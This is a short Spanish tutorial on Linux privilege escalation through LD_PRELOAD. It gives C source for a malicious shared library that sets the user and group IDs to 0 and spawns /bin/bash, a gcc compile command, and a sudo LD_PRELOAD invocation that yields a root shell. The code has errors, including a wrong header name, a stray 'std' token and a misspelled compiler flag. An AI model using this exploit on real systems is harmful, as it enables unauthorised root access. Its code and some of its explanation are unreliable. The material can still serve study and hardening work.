
Para entender como funciona esta explotación es importante entender que es LD_PRELOAD

# Que es y de que se encarga LD_PRELOAD

- LD_PRELOAD: Contiene una o más rutas a bibliotecas u objetos compartidos que tendrán más prioridad que las ubicadas en las rutas estándar las cuales se le pasarán a LD (Dynamic linker)

- Con lo anterior podemos llegar a la conclusión de que LD_PRELOAD  se encarga de almacenar rutas de librerías y indicarle a LD ( Dynamic Linker ) que ejecute esa librería antes que cualquier otra al ejecutar un programa que para el usuario sean importantes y una prioridad para cargar primero

# Como nos podemos aprovechar de esto

- Teniendo en cuenta esto podemos cargar una librería maliciosa que nos permita crear una shell como root, para esto se usa C, crearemos el siguiente código, si no lo entiendes no te preocupes, lo desglosare poco a poco:

```c
#include <stdlib.h>
#include <sys/type.h> 
#include <stdio.h>

void _init(){
	unsetenv("LD_PRELOAD");
	setuid(0);std
	setgid(0);
	system("/bin/bash");
}
```

Como pueden ver es un código muy simple, pero igualmente quiero aclarar todo

- Librerías: Como puedes ver en el código importamos las librerías \ <stdlib.h>, <sys/type.h> y <stdio.h>

- unsetenv("LD_PRELOAD"): la función unsetenv elimina una variable de entorno en este caso borramos la variable unsetenv porque si no se repetiría infinitamente el código haciendo que la shell se rompa

- setuid(0) y setgid(0) definimos el id de la session y del grupo se establece en "0" ( "0" es el numero de usuario y el numero de grupo que hace alusión a root )

- system("/bin/bash"): ejecuta el comando y se mete en una shell como root

Listo, ya tenemos el script ahora tenemos que compilarlo como una libreria para que LD lo ejecute 


```bash
gcc -fPIC -shared -o shell.so shell.c -nostartfile
```

Listo, ya tenemos la libreria, ahora solonos hace falta agregar la ruta de la libreria a la variable LD_PRELOAD para que LD la ejecute, pero aqui tengo que aclarar algo, tiene que haber algun comando que podamos ejecutar como sudo, estos comandos que podemos ejecutar como sudo sin proporcionar contraseña los podemos ver con el comando sudo -l, en mi caso podia ejecutar apache2:

```bash
sudo LD_PRELOAD=/archivo/a/libreria {comando_que_se_puede_ejecutar_como_sudo}
```

Y listo, ya tendriamos nuestra shell
